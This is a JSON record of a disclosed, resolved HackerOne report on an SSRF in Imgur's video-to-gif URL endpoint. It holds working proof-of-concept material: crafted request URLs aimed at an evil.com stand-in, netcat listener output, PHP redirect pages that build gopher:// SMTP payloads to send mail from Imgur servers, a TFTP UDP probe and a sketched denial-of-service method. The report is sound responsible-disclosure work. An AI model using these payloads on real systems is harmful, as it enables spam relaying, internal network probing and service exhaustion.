{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-02-11T07:09:45.059Z", 
    "voters": [
        "irvinlim", 
        "nirvana-msu", 
        "michiel", 
        "aesteral", 
        "r0x33d", 
        "hunter", 
        "bogdantcaciuc", 
        "anovg", 
        "0xsyndr0me", 
        "geeknik", 
        "and 11 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "2000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 115748, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "SSRF in https://imgur.com/vidgif/url", 
    "is_member_of_team?": null, 
    "vote_count": 21, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-03-12T07:09:45.469Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$2,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-02-10T18:58:08.007Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-10T18:58:08.007Z", 
            "actor": {
                "username": "aesteral", 
                "url": "/aesteral", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/049/7178d83d0518c66d0f3f32c0aabbd9c9f6e27be6_medium.png?1383924384"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "imgur", 
            "message": "There is also a non-tested possibility to append arbitrary lines to syslog by using:\n\nLocation: dict://localhost:514/TEST", 
            "markdown_message": "<p>There is also a non-tested possibility to append arbitrary lines to syslog by using:</p>\n\n<p>Location: dict://localhost:514/TEST</p>\n", 
            "type": "Activities::Comment", 
            "id": 793344, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-10T19:33:20.562Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-10T19:33:20.562Z", 
            "actor": {
                "username": "jacobg", 
                "url": "/jacobg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "imgur", 
            "message": "We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!", 
            "markdown_message": "<p>We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 793397, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "aesteral", 
                "url": "/aesteral"
            }, 
            "created_at": "2016-02-10T20:35:42.242Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-10T20:35:42.242Z", 
            "actor": {
                "username": "jacobg", 
                "url": "/jacobg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "imgur", 
            "message": "We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! ", 
            "markdown_message": "<p>We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! </p>\n", 
            "type": "Activities::BugResolved", 
            "id": 793469, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-10T20:35:56.957Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-10T20:35:56.957Z", 
            "actor": {
                "username": "jacobg", 
                "url": "/jacobg", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "imgur", 
            "message": "@kcramer will follow up with you with bounty. ", 
            "markdown_message": "<p><a href=\"/kcramer\">@kcramer</a> will follow up with you with bounty. </p>\n", 
            "type": "Activities::Comment", 
            "id": 793471, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-02-10T23:48:11.501Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-10T23:48:11.501Z", 
            "actor": {
                "url": "/imgur", 
                "profile": {
                    "name": "Imgur"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/638/5e49a2043319afa75d7619aaf1866b665f315ef7_medium.png?1416868794"
                }
            }, 
            "team_handle": "imgur", 
            "bounty_amount": "2000.0", 
            "collaborator": {
                "username": "aesteral", 
                "url": "/aesteral"
            }, 
            "message": "Hi @aesteral, thanks for the report and for doing all the POCs etc. It's really well written and helped us take care of the issue quickly! Hope you keep digging around Imgur!", 
            "markdown_message": "<p>Hi <a href=\"/aesteral\">@aesteral</a>, thanks for the report and for doing all the POCs etc. It&#39;s really well written and helped us take care of the issue quickly! Hope you keep digging around Imgur!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 793656, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-11T07:09:45.106Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-11T07:09:45.106Z", 
            "actor": {
                "username": "aesteral", 
                "url": "/aesteral", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/049/7178d83d0518c66d0f3f32c0aabbd9c9f6e27be6_medium.png?1383924384"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "imgur", 
            "first_to_agree": true, 
            "message": "Thanks! Please allow to disclose this. ", 
            "markdown_message": "<p>Thanks! Please allow to disclose this. </p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 793901, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-11T16:34:23.806Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-11T16:34:23.806Z", 
            "actor": {
                "username": "sl1m", 
                "url": "/sl1m", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/055/764/c243732cb3a5bc85b7f81ca4c7a79a085b7b81fe_medium.jpg?1455406353"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "duplicate_report_id": 115857
            }, 
            "team_handle": "imgur", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ExternalUserJoined", 
            "id": 794556, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-12T07:09:50.650Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-12T07:09:50.650Z", 
            "actor": {
                "url": "/imgur", 
                "profile": {
                    "name": "Imgur"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/638/5e49a2043319afa75d7619aaf1866b665f315ef7_medium.png?1416868794"
                }
            }, 
            "team_handle": "imgur", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 836364, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "aesteral", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/aesteral", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/049/bd049c60e2949b4c2de370eb6bef480e87e7f3c2_small.png?1383924384"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 48, 
        "name": "Denial of Service"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -86370388.69878799, 
    "disclosed_at": "2016-03-12T07:09:50.541Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/115748", 
    "created_at": "2016-02-10T18:53:22.071Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hello,</p>\n\n<h1 id=\"short-description\">Short description</h1>\n\n<p><a title=\"https://imgur.com/vidgif/url\" href=\"/redirect?signature=063a58120b5418483d83d42422891f9fb742b536&amp;url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://imgur.com/vidgif/url</span><i class=\"icon-external-link\"></i></a> endpoint is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and craft outgoing UDP-packets / telnet-based protocol sessions (for example, to connect to SMTP servers from imgur and send spam).</p>\n\n<h1 id=\"why-does-the-vulnerability-exist\">Why does the vulnerability exist?</h1>\n\n<p>imgur allows users to use &#39;video-to-gif&#39; service. When a user requests conversion of such a video, imgur&#39;s servers perform an HTTP request to a user-supplied URL in order to discover the URL-s content-type and length. It is evident that in order to do so imgur utilizes libcurl. However, imgur does not properly validate user input and does not configure libcurl properly which allows an attacker to use various libcurl protocol wrappers other than http(s). For example, an attacker can supply <a title=\"ftp://test.com/file\" href=\"/redirect?signature=107ae52180b14a3c1b8dc53405cf55910ad82cf2&amp;url=ftp%3A%2F%2Ftest.com%2Ffile\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://test.com/file</span><i class=\"icon-external-link\"></i></a> as an URL and imgur will make such a FTP request.</p>\n\n<h1 id=\"what-are-the-exploitable-protocols\">What are the exploitable protocols?</h1>\n\n<p>Apparently, imgur performs connections over the following protocols:</p>\n\n<ul>\n<li>SSH (scp://, sftp://)</li>\n<li>POP3</li>\n<li>IMAP</li>\n<li>SMTP</li>\n<li>FTP</li>\n<li>DICT</li>\n<li>GOPHER</li>\n<li>TFTP</li>\n</ul>\n\n<p>Several leak information about imgur infrastracture (SSH, DICT), other allow more serious exploits (TFTP, DICT, GOPHER).</p>\n\n<h1 id=\"what-are-the-exploits\">What are the exploits?</h1>\n\n<h2 id=\"simple-exploit-information-disclosure-and-basic-poc-of-ssrf\">Simple exploit: information disclosure (and basic PoC of SSRF)</h2>\n\n<p>imgur leaks information about installed software versions via SSH and DICT protocols. An attacker may setup a &#39;netcat&#39; server and force imgur servers to connect to it and leak version information via a connection string, for example:</p>\n\n<p>Request: <a title=\"https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\" href=\"/redirect?signature=32c11500055d38469f1d903b70ffd2d0c01086d3&amp;url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dsftp%3A%2F%2Fevil.com%3A11111%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://imgur.com/vidgif/url?url=sftp://evil.com:11111/</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>evil.com:$ nc -v -l 11111\nConnection from [54.227.37.234] port 11111 [tcp/*] accepted (family 2, sport 36136)\nSSH-2.0-libssh2_1.4.2\n</code></pre>\n<p>Request: <a title=\"https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\" href=\"/redirect?signature=32c11500055d38469f1d903b70ffd2d0c01086d3&amp;url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dsftp%3A%2F%2Fevil.com%3A11111%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://imgur.com/vidgif/url?url=sftp://evil.com:11111/</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>evil.com:$ nc -v -l 11111\nListening on [0.0.0.0] (family 0, port 11111)\nConnection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)\nCLIENT libcurl 7.40.0\n\nQUIT\n</code></pre>\n<p>This way an attacker can discover imgur software versions: libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237). All there are probable RCEs.</p>\n\n<h2 id=\"crafted-smtp-connection-exploit\">Crafted SMTP connection exploit</h2>\n\n<p>Curl&#39;s GOPHER protocol implementation allows usage of newlines which allows us to craft any kinds of TELNET chat-sessions and thus craft any kind of TELNET-based protocols request. In this example we will craft a SMTP request to mail.ru.</p>\n\n<p>Unfortunately imgur filters GET[&#39;url&#39;] and does not allow us to include newlines in the request, however, imgur&#39;s libcurl follows redirects which allows us to send a correct GOPHER payload via HTTP 302.</p>\n\n<p>Let&#39;s start with a TELNET chat session example, let&#39;s craft a malicious php page:</p>\n\n<p><a title=\"http://evil.com/imgur/gopher1.php\" href=\"/redirect?signature=a486514b9f892958b287ee480f2065c3f69365e8&amp;url=http%3A%2F%2Fevil.com%2Fimgur%2Fgopher1.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://evil.com/imgur/gopher1.php</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n        header(&#39;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest&#39;);\n?&gt;\n</code></pre><pre class=\"highlight plaintext\"><code>evil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [54.227.37.234] port 12346 [tcp/*] accepted (family 2, sport 49398)\nHI\nMultiline\ntest\n</code></pre>\n<p>So, we can send arbitrary telnet commands and can try to perform an <strong>actual SMTP session and send SPAM from Imgur IPs</strong></p>\n\n<p>To demonstrate we will use test.smtp.org testing server.</p>\n\n<p>Let&#39;s craft a malicious php page (this one is a working example so I use a real server):</p>\n\n<p><a title=\"http://gradeco.ru/imgur/gopher2.php\" href=\"/redirect?signature=9428a65ae4e6bff3bc17eb608e872ef216cbf122&amp;url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fgopher2.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://gradeco.ru/imgur/gopher2.php</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n        $commands = array(\n                &#39;HELO test.org&#39;,\n                &#39;MAIL FROM: &lt;imgur@imgur.com&gt;&#39;,\n                &#39;RCPT TO: &lt;bit-bucket@test.smtp.org&gt;&#39;,\n                &#39;DATA&#39;,\n                &#39;Test mail&#39;,\n                &#39;.&#39;\n        );\n\n        $payload = implode(&#39;%0A&#39;, $commands);\n\n        header(&#39;Location: gopher://test.smtp.org:25/_&#39;.$payload);\n?&gt;\n</code></pre>\n<p>This code concats our SMTP command into one line delimited by %0A and forces imgur server to send a &#39;GOPHER&#39; request to a SMTP server while actually sending a <strong>valid SMTP request</strong></p>\n\n<p>Now, we should navigate to: <a title=\"https://imgur.com/vidgif/url?url=http://gradeco.ru/imgur/gopher2.php?rand=RAND\" href=\"/redirect?signature=8e38708b10dece9dd186dd5b5e9d8043ff6a9ee2&amp;url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dhttp%3A%2F%2Fgradeco.ru%2Fimgur%2Fgopher2.php%3Frand%3DRAND\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://imgur.com/vidgif/url?url=http://gradeco.ru/imgur/gopher2.php?rand=RAND</span><i class=\"icon-external-link\"></i></a> (rand to prevent caching).</p>\n\n<p>And imgur server will connect to test.smtp.org and send an email message! You can check it via smtp log here: <a title=\"http://test.smtp.org/log\" href=\"/redirect?signature=3a4fcb03486a2197c1784ed93851e799e20c21e7&amp;url=http%3A%2F%2Ftest.smtp.org%2Flog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://test.smtp.org/log</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>Feb 10 18:32:41 z testmail[45856]: NOQUEUE: connect from ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45856]: AUTH: available mech=SCRAM-SHA-1 DIGEST-MD5 OTP CRAM-MD5 NTLM LOGIN PLAIN ANONYMOUS, allowed mech=EXTERNAL SCRAM-SHA-1 DIGEST-MD5 CRAM-MD5 PLAIN LOGIN ANONYMOUS\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: Milter: no active filter\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: from=&lt;imgur@imgur.com&gt;, size=10, class=0, nrcpts=1, msgid=&lt;201602101832.u1AIWf5H045856@test.smtp.org&gt;, proto=SMTP, daemon=testv4, relay=ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: alias &lt;bit-bucket@test.smtp.org&gt; =&gt; /dev/null\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: to=/dev/null, ctladdr=&lt;bit-bucket@test.smtp.org&gt; (26/0), delay=00:00:00, xdelay=00:00:00, mailer=*file*, pri=30386, dsn=2.0.0, stat=Sent\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: done; delay=00:00:00, ntries=1\n</code></pre>\n<p>Cool, now we can send spam from imgur servers :)</p>\n\n<p>Same method can be used to connect to, say, REDIS servers, unavailable from external network.</p>\n\n<h2 id=\"crafted-udp-connection-exploit\">Crafted UDP connection exploit</h2>\n\n<p>We can send almost arbitrary UDP packets by using TFTP protocol, here is an example:</p>\n\n<p>Request: <a title=\"https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET\" href=\"/redirect?signature=3c510575d207599d04f3610257bbb4ddb1798a0b&amp;url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dtftp%3A%2F%2Fevil.com%3A12346%2FTESTUDPPACKET\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>evil.com:# nc -v -u -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nTESTUDPPACKEToctettsize0blksize512timeout6\n</code></pre>\n<p>This can be used to craft request to various UDP-services like Memcache or REDIS-UDP.</p>\n\n<h2 id=\"denial-of-service-exploit-obviously-not-tested\">Denial of service exploit (obviously not tested)</h2>\n\n<p>It seems that imgur servers have VERY long timeout for their curl-requests. An attacker can use iptables&#39; TARPIT target to block requests for a prolonged time and CURL&#39;s FTP:// protocol which never timeouts.</p>\n\n<p>An attacker can send all TCP traffic to port 12345 to TARPIT and the request </p>\n\n<p><a title=\"https://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST\" href=\"/redirect?signature=77a12b2973792ba141fab46e0ea7b690f6af4b45&amp;url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dftp%3A%2F%2Fevil.com%3A12345%2FTEST\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>In this case, imgur will open an FTP connection from 3 servers (apparently due to retries) and keep it open for a long time (10&#39;s of seconds). An attacker can initiate lots of vidgif/url requests to exhaust imgur servers&#39; resources.</p>\n", 
    "vulnerability_information": "Hello,\n\nShort description\n========\n\nhttps://imgur.com/vidgif/url endpoint is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and craft outgoing UDP-packets / telnet-based protocol sessions (for example, to connect to SMTP servers from imgur and send spam).\n\nWhy does the vulnerability exist?\n========\n\nimgur allows users to use 'video-to-gif' service. When a user requests conversion of such a video, imgur's servers perform an HTTP request to a user-supplied URL in order to discover the URL-s content-type and length. It is evident that in order to do so imgur utilizes libcurl. However, imgur does not properly validate user input and does not configure libcurl properly which allows an attacker to use various libcurl protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and imgur will make such a FTP request.\n\nWhat are the exploitable protocols?\n========\nApparently, imgur performs connections over the following protocols:\n* SSH (scp://, sftp://)\n* POP3\n* IMAP\n* SMTP\n* FTP\n* DICT\n* GOPHER\n* TFTP\n\nSeveral leak information about imgur infrastracture (SSH, DICT), other allow more serious exploits (TFTP, DICT, GOPHER).\n\nWhat are the exploits?\n=========\nSimple exploit: information disclosure (and basic PoC of SSRF)\n----------------\nimgur leaks information about installed software versions via SSH and DICT protocols. An attacker may setup a 'netcat' server and force imgur servers to connect to it and leak version information via a connection string, for example:\n\nRequest: https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\n\n```\nevil.com:$ nc -v -l 11111\nConnection from [54.227.37.234] port 11111 [tcp/*] accepted (family 2, sport 36136)\nSSH-2.0-libssh2_1.4.2\n```\n\nRequest: https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\n\n```\nevil.com:$ nc -v -l 11111\nListening on [0.0.0.0] (family 0, port 11111)\nConnection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)\nCLIENT libcurl 7.40.0\n\nQUIT\n```\n\nThis way an attacker can discover imgur software versions: libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237). All there are probable RCEs.\n\nCrafted SMTP connection exploit\n-------------\nCurl's GOPHER protocol implementation allows usage of newlines which allows us to craft any kinds of TELNET chat-sessions and thus craft any kind of TELNET-based protocols request. In this example we will craft a SMTP request to mail.ru.\n\nUnfortunately imgur filters GET['url'] and does not allow us to include newlines in the request, however, imgur's libcurl follows redirects which allows us to send a correct GOPHER payload via HTTP 302.\n\nLet's start with a TELNET chat session example, let's craft a malicious php page:\n\nhttp://evil.com/imgur/gopher1.php\n\n```\n<?php\n        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');\n?>\n```\n\n```\nevil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [54.227.37.234] port 12346 [tcp/*] accepted (family 2, sport 49398)\nHI\nMultiline\ntest\n```\n\nSo, we can send arbitrary telnet commands and can try to perform an **actual SMTP session and send SPAM from Imgur IPs**\n\nTo demonstrate we will use test.smtp.org testing server.\n\nLet's craft a malicious php page (this one is a working example so I use a real server):\n\nhttp://gradeco.ru/imgur/gopher2.php\n\n```\n<?php\n        $commands = array(\n                'HELO test.org',\n                'MAIL FROM: <imgur@imgur.com>',\n                'RCPT TO: <bit-bucket@test.smtp.org>',\n                'DATA',\n                'Test mail',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://test.smtp.org:25/_'.$payload);\n?>\n```\n\nThis code concats our SMTP command into one line delimited by %0A and forces imgur server to send a 'GOPHER' request to a SMTP server while actually sending a **valid SMTP request**\n\nNow, we should navigate to: https://imgur.com/vidgif/url?url=http://gradeco.ru/imgur/gopher2.php?rand=RAND (rand to prevent caching).\n\nAnd imgur server will connect to test.smtp.org and send an email message! You can check it via smtp log here: http://test.smtp.org/log\n\n```\nFeb 10 18:32:41 z testmail[45856]: NOQUEUE: connect from ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45856]: AUTH: available mech=SCRAM-SHA-1 DIGEST-MD5 OTP CRAM-MD5 NTLM LOGIN PLAIN ANONYMOUS, allowed mech=EXTERNAL SCRAM-SHA-1 DIGEST-MD5 CRAM-MD5 PLAIN LOGIN ANONYMOUS\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: Milter: no active filter\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: from=<imgur@imgur.com>, size=10, class=0, nrcpts=1, msgid=<201602101832.u1AIWf5H045856@test.smtp.org>, proto=SMTP, daemon=testv4, relay=ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: alias <bit-bucket@test.smtp.org> => /dev/null\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: to=/dev/null, ctladdr=<bit-bucket@test.smtp.org> (26/0), delay=00:00:00, xdelay=00:00:00, mailer=*file*, pri=30386, dsn=2.0.0, stat=Sent\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: done; delay=00:00:00, ntries=1\n```\n\nCool, now we can send spam from imgur servers :)\n\nSame method can be used to connect to, say, REDIS servers, unavailable from external network.\n\nCrafted UDP connection exploit\n-------------\nWe can send almost arbitrary UDP packets by using TFTP protocol, here is an example:\n\nRequest: https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET\n\n```\nevil.com:# nc -v -u -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nTESTUDPPACKEToctettsize0blksize512timeout6\n```\n\nThis can be used to craft request to various UDP-services like Memcache or REDIS-UDP.\n\nDenial of service exploit (obviously not tested)\n--------------\nIt seems that imgur servers have VERY long timeout for their curl-requests. An attacker can use iptables' TARPIT target to block requests for a prolonged time and CURL's FTP:// protocol which never timeouts.\n\nAn attacker can send all TCP traffic to port 12345 to TARPIT and the request \n\nhttps://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST\n\nIn this case, imgur will open an FTP connection from 3 servers (apparently due to retries) and keep it open for a long time (10's of seconds). An attacker can initiate lots of vidgif/url requests to exhaust imgur servers' resources.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://imgur.com", 
            "about": "The most awesome images on the Internet.", 
            "twitter_handle": "imgur", 
            "name": "Imgur"
        }, 
        "handle": "imgur", 
        "url": "https://hackerone.com/imgur", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/638/504273f539f9890db3ca9870eac5ff30afc64166_small.png?1416868794", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/638/5e49a2043319afa75d7619aaf1866b665f315ef7_medium.png?1416868794"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 638, 
        "default_currency": "usd"
    }, 
    "is_published": false
}